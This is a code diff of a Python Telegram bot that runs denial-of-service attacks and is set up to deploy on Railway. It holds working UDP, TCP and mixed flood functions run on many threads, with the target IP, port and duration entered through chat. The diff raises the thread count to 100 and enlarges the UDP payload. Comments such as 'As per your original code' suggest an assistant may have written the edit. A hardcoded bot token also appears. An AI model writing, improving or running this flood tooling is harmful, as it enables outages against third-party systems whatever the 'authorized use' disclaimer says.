@@ -1,4 +1,4 @@
-# bot.py - Railway Deploy Ready (NO ERRORS)
+# bot.py - Railway Deploy Ready (Based on your original code)
 import socket
 import threading
 import time
@@ -8,7 +8,7 @@ import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
 
-# ============ CONFIGURATION ============
+# ============ CONFIGURATION (Railway ENV) ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", 8210011971))
 
@@ -18,54 +18,46 @@ attack_stats = {'packets': 0}
 attack_lock = threading.Lock()
 user_data = {}
 
-# ============ ATTACK METHODS ============
-def udp_flood(ip, port, duration):
+# ============ ATTACK METHODS (from your original code) ============
+def udp_flood(ip, port, duration, update_callback):
     global attack_running, attack_stats
     timeout = time.time() + int(duration)
     port = int(port)
     
-    socks = []
-    for _ in range(20):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            socks.append(s)
-        except:
-            pass
-    
-    payload = random._urandom(512)
-    
-    while time.time() < timeout and attack_running:
-        for sock in socks:
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        payload = random._urandom(1024)
+        
+        while time.time() < timeout and attack_running:
             try:
                 sock.sendto(payload, (ip, port))
                 with attack_lock:
                     attack_stats['packets'] += 1
+                time.sleep(0.001)
             except:
                 pass
-        time.sleep(0.0001)
-    
-    for sock in socks:
         sock.close()
+    except:
+        pass
 
-def tcp_flood(ip, port, duration):
+def tcp_flood(ip, port, duration, update_callback):
     global attack_running, attack_stats
     timeout = time.time() + int(duration)
     
     while time.time() < timeout and attack_running:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.1)
+            sock.settimeout(0.5)
             sock.connect_ex((ip, int(port)))
             sock.send(b'GET / HTTP/1.1\r\n\r\n')
             sock.close()
             with attack_lock:
                 attack_stats['packets'] += 1
-            time.sleep(0.0005)
+            time.sleep(0.005)
         except:
             pass
 
-def mixed_attack(ip, port, duration):
+def mixed_attack(ip, port, duration, update_callback):
     global attack_running, attack_stats
     timeout = time.time() + int(duration)
     
@@ -76,7 +68,7 @@ def mixed_attack(ip, port, duration):
             sock.close()
             with attack_lock:
                 attack_stats['packets'] += 1
-            time.sleep(0.0008)
+            time.sleep(0.002)
         except:
             pass
 
@@ -95,10 +87,10 @@ def launch_attack(ip, port, duration, method, update_func):
         target = mixed_attack
     
     threads = []
-    num_threads = 40  # Railway safe
+    num_threads = 100  # As per your original code
     
     for i in range(num_threads):
-        t = threading.Thread(target=target, args=(ip, port, duration), daemon=True)
+        t = threading.Thread(target=target, args=(ip, port, duration, update_func), daemon=True)
         t.start()
         threads.append(t)
     
@@ -140,8 +132,9 @@ def start(update, context):
     
     user_data[user_id] = {'step': 'ip'}
     update.message.reply_text(
-        "🔥 DDoS Bot (Railway) 🔥\n\n"
-        "Send target IP:\nExample: 192.168.1.1"
+        "🔥 DDoS Bot v3.0 (Railway) 🔥\n\n"
+        "Send target IP address:\n"
+        "Example: 192.168.1.1"
     )
 
 def handle_message(update, context):
@@ -163,18 +156,18 @@ def handle_message(update, context):
         user_data[user_id]['ip'] = text
         user_data[user_id]['step'] = 'port'
         update.message.reply_text(
-            f"🔌 Send port:\nExample: 80\n\n"
-            f"🚫 Blocked: {', '.join(map(str, sorted(BLOCKED_PORTS)))}"
+            f"🔌 Send port number:\nExample: 80\n\n"
+            f"🚫 Blocked ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}"
         )
     
     elif step == 'port':
         try:
             port = int(text)
             if port < 1 or port > 65535:
-                update.message.reply_text("❌ Port 1-65535")
+                update.message.reply_text("❌ Port must be 1-65535")
                 return
             if port in BLOCKED_PORTS:
-                update.message.reply_text(f"❌ Port {port} blocked!")
+                update.message.reply_text(f"❌ Port {port} is blocked! Use different port.")
                 return
             
             user_data[user_id]['port'] = port
@@ -186,16 +179,16 @@ def handle_message(update, context):
                 [InlineKeyboardButton("Mixed Attack", callback_data="mixed")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
-            update.message.reply_text("Select method:", reply_markup=reply_markup)
+            update.message.reply_text("Select attack method:", reply_markup=reply_markup)
             
         except ValueError:
-            update.message.reply_text("❌ Send valid port:")
+            update.message.reply_text("❌ Send valid port number:")
     
     elif step == 'duration':
         try:
             duration = int(text)
-            if duration < 5 or duration > 300:
-                update.message.reply_text("❌ Duration 5-300 seconds")
+            if duration < 10 or duration > 300:
+                update.message.reply_text("❌ Duration must be 10-300 seconds")
                 return
             
             ip = user_data[user_id]['ip']
@@ -226,7 +219,7 @@ def handle_message(update, context):
             del user_data[user_id]
             
         except ValueError:
-            update.message.reply_text("❌ Send valid duration:")
+            update.message.reply_text("❌ Send valid duration (seconds):")
 
 def button_callback(update, context):
     query = update.callback_query
@@ -242,8 +235,8 @@ def button_callback(update, context):
         user_data[user_id]['method'] = method
         user_data[user_id]['step'] = 'duration'
         query.edit_message_text(
-            f"✅ Method: {method.upper()}\n\n"
-            f"Send duration (5-300 seconds):"
+            f"✅ Method selected: {method.upper()}\n\n"
+            f"Send duration in seconds (10-300):"
         )
 
 def stop(update, context):
@@ -253,7 +246,7 @@ def stop(update, context):
         return
     
     attack_running = False
-    update.message.reply_text("🛑 Attack stopped")
+    update.message.reply_text("🛑 Attack stopped by user")
 
 def help_command(update, context):
     if update.effective_user.id != ADMIN_ID:
@@ -262,17 +255,23 @@ def help_command(update, context):
     
     update.message.reply_text(
         "🤖 DDoS Bot Commands\n\n"
-        "/start - Start attack\n"
-        "/stop - Stop attack\n"
-        "/help - This menu\n\n"
+        "/start - Start attack setup\n"
+        "/stop - Stop running attack\n"
+        "/help - Show this help\n\n"
+        "Attack Process:\n"
+        "1. IP address\n"
+        "2. Port number\n"
+        "3. Method (UDP/TCP/Mixed)\n"
+        "4. Duration (10-300s)\n\n"
         f"Blocked Ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}\n\n"
-        "⚠️ Authorized use only!"
+        "⚠️ Use only on authorized targets!"
     )
 
 def main():
     print("=" * 50)
-    print("🚀 DDoS Bot Deploying on Railway...")
+    print("🔥 Starting DDoS Bot on Railway...")
     print(f"👑 Admin ID: {ADMIN_ID}")
+    print(f"🚫 Blocked ports: {sorted(BLOCKED_PORTS)}")
     print("=" * 50)
     
     updater = Updater(BOT_TOKEN, use_context=True)
@@ -284,7 +283,7 @@ def main():
     dp.add_handler(CallbackQueryHandler(button_callback))
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
     
-    print("✅ Bot is LIVE! Send /start on Telegram")
+    print("✅ Bot is running! Send /start on Telegram")
     print("=" * 50)
     
     updater.start_polling()
